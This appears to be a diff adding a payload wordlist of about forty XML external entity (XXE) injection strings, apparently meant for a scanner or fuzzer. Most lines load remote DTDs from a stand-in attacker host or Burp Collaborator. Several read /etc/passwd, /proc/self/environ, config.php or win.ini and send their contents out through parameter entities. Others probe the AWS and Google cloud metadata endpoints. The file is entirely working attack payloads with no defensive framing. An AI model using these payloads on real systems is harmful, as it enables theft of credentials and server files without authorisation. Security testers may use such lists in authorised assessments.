@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER-SERVER.com">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/xxe.dtd">%xxe;]><foo>test</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com">%xxe;]><foo>test</foo>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com">%xxe;%param1;]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/xxe">%xxe;]><foo>&send;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;]>
+<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;%send;]>
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///c:/windows/win.ini"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;]><data>&send;</data>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net">%xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net/xxe">%xxe;]><foo>test</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net">%xxe;]><foo>bar</foo>
+<!DOCTYPE data [<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER.com/ext.dtd">%remote;%init;%trick;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/blind.dtd">%xxe;%eval;%error;]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com">%xxe;]><foo>test</foo>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;%all;]><foo>test</foo>
+<!DOCTYPE doc [<!ENTITY % oob SYSTEM "http://ATTACKER-SERVER.com/oob.xml">%oob;%external;%intern;]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ATTACKER-SERVER.com/xxe.dtd">%xxe;]><foo>test</foo>
+<!DOCTYPE foo [<!ENTITY % p1 SYSTEM "http://ATTACKER-SERVER.com/">%p1;]>
+<!DOCTYPE foo [<!ENTITY % p1 SYSTEM "http://ATTACKER-SERVER.com/x">%p1;%p2;]>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://burpcollaborator.net/x.dtd">%remote;]><foo>test</foo>
+<!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;%send;]>
+<!DOCTYPE doc [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER-SERVER.com/?x=%file;'>">%eval;%exfil;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">%xxe;]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://ATTACKER-SERVER.com/xxe.dtd">%xxe;]><foo>test</foo>
+<!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com:8080/evil.dtd">%dtd;%all;]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % pe SYSTEM "http://ATTACKER-SERVER.com/param.dtd">%pe;%param;]><foo>&exfil;</foo>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/xxe?payload=test">%xxe;]>
+<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://ATTACKER-SERVER.com/ext.dtd">%remote;%param1;%param2;]>
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a SYSTEM "http://ATTACKER-SERVER.com">%a;]><foo>x</foo>
+<!DOCTYPE data [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/combine.dtd">%dtd;]>
+<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://ATTACKER-SERVER.com/xxe.dtd"><foo>test</foo>
+<!DOCTYPE foo PUBLIC "-//XXE//EN" "http://ATTACKER-SERVER.com/xxe.dtd">
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/xxe">%xxe;]><request><foo>bar</foo></request>
+<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///proc/self/environ"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/evil.dtd">%dtd;]>
+<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///var/www/html/config.php"><!ENTITY % dtd SYSTEM "http://ATTACKER-SERVER.com/exfil.dtd">%dtd;]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com/%0a">%xxe;]><foo>test</foo>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-SERVER.com"><!ENTITY callhome SYSTEM "http://ATTACKER-SERVER.com/?%xxe;">]><foo>&callhome;</foo>
